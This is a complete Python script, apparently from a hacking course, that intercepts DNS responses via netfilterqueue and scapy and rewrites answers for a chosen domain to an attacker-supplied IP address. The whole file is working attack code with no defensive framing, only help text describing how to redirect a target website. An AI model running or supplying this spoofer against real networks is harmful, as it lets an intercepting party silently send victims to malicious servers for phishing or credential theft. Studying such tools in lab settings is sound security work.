#!/usr/bin/env python

import argparse  # Import the argparse module to handle command-line arguments
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.target in str(qname):  # Use the specified target from command-line argument
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=options.target, rdata=options.new_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()

# Add a description and usage examples for the command-line arguments
parser = argparse.ArgumentParser(description="Spoof DNS responses to redirect a target website.")
parser.add_argument("target", help="Specify the target website to spoof (e.g., www.bing.com)")
parser.add_argument("new_ip", help="Specify the IP address to redirect the target website to")
options = parser.parse_args()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

try:
    while True:
        queue.run()
except KeyboardInterrupt:
    print("\n[-] Exiting program")
